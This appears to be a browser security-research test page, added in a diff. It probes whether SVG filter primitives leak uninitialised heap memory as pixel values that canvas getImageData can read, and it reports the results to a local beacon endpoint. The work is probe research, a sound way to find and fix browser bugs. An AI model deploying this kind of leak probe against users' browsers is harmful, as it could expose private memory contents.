@@ -1,0 +1,166 @@
+<!--
+  p611: SVG filter heap read via buffer overread
+
+  SVG filters allocate ImageBuffers for intermediate results. If these buffers
+  aren't zeroed, or if filter primitives read outside the filter region, heap
+  data may appear as pixel values readable via canvas getImageData.
+
+  Key vectors:
+  1. feOffset: shifts source, vacated area should be transparent. If buffer not zeroed → heap.
+  2. feGaussianBlur: huge stdDeviation on tiny source. Periphery should be near-zero.
+  3. feConvolveMatrix: edgeMode=none with kernel extending outside filter region.
+     Should return 0 for OOB, but buggy impl might read buffer.
+  4. feMorphology: dilate radius extends source. Expanded edges should be source color.
+  5. feTile: partial tile coverage, edge pixels.
+  6. feFlood: allocates output buffer, fills with color. feFlood transparent → was buffer zeroed?
+
+  CRASH_CLASS: LOW
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p611</title>
+<script>
+var bx=new XMLHttpRequest();
+function b(m){try{bx.open('GET','/beacon/'+encodeURIComponent(m),false);bx.send();}catch(e){}}
+function bp(m,d){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent(m),false);x.send(d);}catch(e){}}
+
+function S(w,h,inner){
+    return '<svg xmlns="http://www.w3.org/2000/svg" width="'+w+'" height="'+h+'">'+inner+'</svg>';
+}
+function F(id,x,y,w,h,inner){
+    return '<filter id="'+id+'" filterUnits="userSpaceOnUse" x="'+x+'" y="'+y+'" width="'+w+'" height="'+h+'">'+inner+'</filter>';
+}
+
+function scan(img,tag,cw,ch){
+    try{
+        var c=document.createElement('canvas');c.width=cw;c.height=ch;
+        var ctx=c.getContext('2d');ctx.drawImage(img,0,0);
+        var pd=ctx.getImageData(0,0,cw,ch),d=pd.data;
+        var nz=0,nza=0,samp=[];
+        for(var i=0;i<d.length;i+=4){
+            var r=d[i],g=d[i+1],bl=d[i+2],a=d[i+3];
+            if(r||g||bl){nz++;if(samp.length<12)samp.push((i/4)+'='+r+','+g+','+bl+','+a);}
+            if(a>0)nza++;
+        }
+        b(tag+'-nz='+nz+'/'+Math.floor(d.length/4)+'-nza='+nza);
+        if(samp.length>0)b(tag+'-S='+samp.join('|'));
+
+        // Count pixels by region: inside expected rect vs outside
+        // (test-specific, uses data attribute)
+        return nz;
+    }catch(e){b(tag+'-SCANERR='+e.message);return-1;}
+}
+
+// Build 21x21 kernel: all zeros except position (kx,ky)=1
+function kern21(kx,ky){
+    var k=[];for(var i=0;i<441;i++)k.push(i===(ky*21+kx)?'1':'0');
+    return k.join(' ');
+}
+
+var T=[
+// T0: CTRL — 64x64 red rect, no filter, 256x256 canvas
+// Expected: 4096 red pixels + 61440 transparent
+['CTRL',
+S(256,256,'<rect x="0" y="0" width="64" height="64" fill="#FF0000"/>'),
+256,256],
+
+// T1: OFFSET-128 — feOffset shifts 64x64 red rect to (128,128)
+// Area (0,0)-(128,128) should be transparent. If buffer not zeroed → heap.
+['OFFSET-128',
+S(256,256,
+'<defs>'+F('f',0,0,256,256,'<feOffset dx="128" dy="128"/>')+'</defs>'+
+'<rect x="0" y="0" width="64" height="64" fill="#FF0000" filter="url(#f)"/>'),
+256,256],
+
+// T2: BLUR-50 — feGaussianBlur stdDeviation=50 on tiny 8x8 rect at center
+// At distance 150px from center, Gaussian ≈ 0. Those pixels should be truly zero.
+// If buffer not zeroed: periphery has non-zero noise from heap.
+['BLUR-50',
+S(256,256,
+'<defs>'+F('f',0,0,256,256,'<feGaussianBlur stdDeviation="50"/>')+'</defs>'+
+'<rect x="124" y="124" width="8" height="8" fill="#FF0000" filter="url(#f)"/>'),
+256,256],
+
+// T3: CONVOLVE-EDGE — 21x21 kernel on 56x56 rect, filter region = rect bounds
+// Kernel: all weight at corner (0,0), targetX=10 targetY=10
+// For pixel at filter region edge: kernel pos (0,0) = 10px up-left = OUTSIDE filter region
+// edgeMode=none should skip it → output 0. If buggy → reads before buffer.
+['CONVOLVE-EDGE',
+S(256,256,
+'<defs>'+F('f',100,100,56,56,
+'<feConvolveMatrix order="21" targetX="10" targetY="10" edgeMode="none" divisor="1" '+
+'kernelMatrix="'+kern21(0,0)+'"/>')+'</defs>'+
+'<rect x="100" y="100" width="56" height="56" fill="#FF0000" filter="url(#f)"/>'),
+256,256],
+
+// T4: CONVOLVE-CENTER — same but kernel at center (identity). Control for T3.
+['CONVOLVE-CTR',
+S(256,256,
+'<defs>'+F('f',100,100,56,56,
+'<feConvolveMatrix order="21" targetX="10" targetY="10" edgeMode="none" divisor="1" '+
+'kernelMatrix="'+kern21(10,10)+'"/>')+'</defs>'+
+'<rect x="100" y="100" width="56" height="56" fill="#FF0000" filter="url(#f)"/>'),
+256,256],
+
+// T5: MORPH-32 — feMorphology dilate radius=32 on 16x16 rect
+// Dilates source by 32px in each direction → 80x80 output
+// Expanded edges should be solid red. Non-red edges = buffer issue.
+['MORPH-32',
+S(256,256,
+'<defs>'+F('f',0,0,256,256,'<feMorphology operator="dilate" radius="32"/>')+'</defs>'+
+'<rect x="100" y="100" width="16" height="16" fill="#FF0000" filter="url(#f)"/>'),
+256,256],
+
+// T6: TILE-7 — feTile of 7x7 rect across 256x256
+// 256/7 = 36.57... → last column/row of tiles is partial
+// Partial tile pixels at edges should still be source color or transparent
+['TILE-7',
+S(256,256,
+'<defs>'+F('f',0,0,256,256,'<feTile/>')+'</defs>'+
+'<rect x="0" y="0" width="7" height="7" fill="#FF0000" filter="url(#f)"/>'),
+256,256],
+
+// T7: OFFSET+MERGE — feOffset + feMerge with empty first layer
+// Tests if merge node allocates a fresh buffer (should be transparent)
+['OFFSET-MERGE',
+S(256,256,
+'<defs>'+F('f',0,0,256,256,
+'<feOffset dx="128" dy="128" result="shifted"/>'+
+'<feMerge><feMergeNode/><feMergeNode in="shifted"/></feMerge>')+'</defs>'+
+'<rect x="0" y="0" width="64" height="64" fill="#FF0000" filter="url(#f)"/>'),
+256,256]
+];
+
+function main(){
+    b('P611-SVG-FILTER-'+T.length+'T');
+    var t0=Date.now();
+    var sk=0;try{sk=parseInt(localStorage.getItem('p611s')||'0');}catch(e){}
+    if(sk>0)b('SKIP='+sk);
+
+    function run(i){
+        if(i>=T.length){
+            b('P611-DONE-'+(Date.now()-t0)+'ms');
+            try{localStorage.removeItem('p611s');}catch(e){}
+            return;
+        }
+        try{localStorage.setItem('p611s',String(i+1));}catch(e){}
+        var name=T[i][0];
+        b('T'+i+'-'+name);
+        var svg=T[i][1],cw=T[i][2],ch=T[i][3];
+        var blob=new Blob([svg],{type:'image/svg+xml'});
+        var url=URL.createObjectURL(blob);
+        var img=new Image(),dn=false;
+        img.onload=function(){if(dn)return;dn=true;
+            b('T'+i+'-OK-'+img.width+'x'+img.height);
+            scan(img,'T'+i,cw,ch);
+            URL.revokeObjectURL(url);run(i+1);
+        };
+        img.onerror=function(){if(dn)return;dn=true;
+            b('T'+i+'-ERR');
+            URL.revokeObjectURL(url);run(i+1);
+        };
+        setTimeout(function(){if(!dn){dn=true;b('T'+i+'-TMO');URL.revokeObjectURL(url);run(i+1);}},10000);
+        img.src=url;
+    }
+    run(sk);
+}
+setTimeout(main,200);
+</script></head><body>p611: SVG filter overread</body></html>
